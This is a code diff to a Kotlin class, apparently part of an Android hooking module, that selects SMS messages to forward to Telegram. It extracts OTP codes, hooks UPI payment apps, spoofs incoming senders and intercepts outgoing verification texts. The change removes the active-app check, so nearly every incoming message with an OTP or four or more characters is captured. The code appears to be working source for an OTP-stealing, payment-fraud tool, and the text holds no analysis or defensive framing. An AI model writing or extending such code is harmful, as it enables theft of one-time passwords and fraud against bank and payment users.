@@ -37,19 +37,11 @@ object SmsMatcher {
 
     fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String, direction: String): Boolean {
         if (!config.autoForwardToken) return false
-        val activePkg = ActiveHookManager.readActivePackage()
-        val hooked = enabledHookedApps(config)
-        if (hooked.isEmpty()) return false
-        if (activePkg != null && config.hookedUpiApps[activePkg] == true) {
-            return when (direction) {
-                "outgoing" -> shouldInterceptOutgoing(config, peer, body)
-                else -> shouldInterceptIncoming(config, peer, body)
-            }
+        if (enabledHookedApps(config).isEmpty()) return false
+        return when (direction) {
+            "outgoing" -> shouldInterceptOutgoing(config, peer, body)
+            else -> shouldInterceptIncoming(config, peer, body)
         }
-        if (activePkg == null && hooked.isNotEmpty()) {
-            return body.isNotBlank() && (extractOtpDigits(body) != null || body.length >= 4)
-        }
-        return false
     }
 
     /**
@@ -60,17 +52,14 @@ object SmsMatcher {
         if (body.isBlank()) return false
         val hooked = enabledHookedApps(config)
         if (hooked.isEmpty()) return false
-        matchedHookedApp(config, peer, body)?.let { return true }
-        val active = ActiveHookManager.readActivePackage()
-        if (active != null && config.hookedUpiApps[active] == true) {
-            if (config.overrideIncomingSender && userSenderId(config) != null) {
-                if (isIndianMobileNumber(peer) || isNumericSender(peer) || isCarrierSenderId(peer)) {
-                    return true
-                }
+        if (matchedHookedApp(config, peer, body) != null) return true
+        if (extractOtpDigits(body) != null) return true
+        if (config.overrideIncomingSender && userSenderId(config) != null) {
+            if (isIndianMobileNumber(peer) || isNumericSender(peer) || isCarrierSenderId(peer)) {
+                return true
             }
-            return extractOtpDigits(body) != null || body.length >= 4
         }
-        return false
+        return body.length >= 4
     }
 
     private val outgoingVerifyKeywords = listOf(
@@ -82,12 +71,10 @@ object SmsMatcher {
         if (!config.hookOutgoingSms && !config.interceptFakeSuccess) return false
         if (body.isBlank() || recipient.isBlank()) return false
         if (enabledHookedApps(config).isEmpty()) return false
-        matchedHookedApp(config, recipient, body)?.let { return true }
-        val active = ActiveHookManager.readActivePackage() ?: return false
-        if (config.hookedUpiApps[active] != true) return false
+        if (matchedHookedApp(config, recipient, body) != null) return true
         val upper = body.uppercase()
         if (outgoingVerifyKeywords.any { upper.contains(it) }) return true
-        return SmsMatcher.isShortCodeRecipient(recipient)
+        return isShortCodeRecipient(recipient)
     }
 
     fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
